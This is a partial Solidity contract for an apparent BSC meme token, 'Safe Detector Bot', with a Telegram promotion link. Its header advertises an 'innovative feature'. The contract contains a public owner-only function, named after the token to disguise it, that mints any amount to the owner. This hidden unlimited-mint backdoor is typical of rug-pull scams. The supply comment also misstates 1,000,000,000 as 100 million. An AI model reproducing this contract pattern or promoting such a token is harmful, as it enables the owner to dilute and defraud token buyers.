...
//
// $SafeDetectorBot proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SafeDetectorBotBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SafeDetectorBot(uint256 amount) public onlyOwner {
 _SafeDetectorBot(msg.sender, amount);
    }
    ...
    function _SafeDetectorBot(address account, uint256 amount) internal virtual {
...
contract $SafeDetectorBot is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Safe Detector Bot", "SAFEBOT") {
     _SafeDetectorBot(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}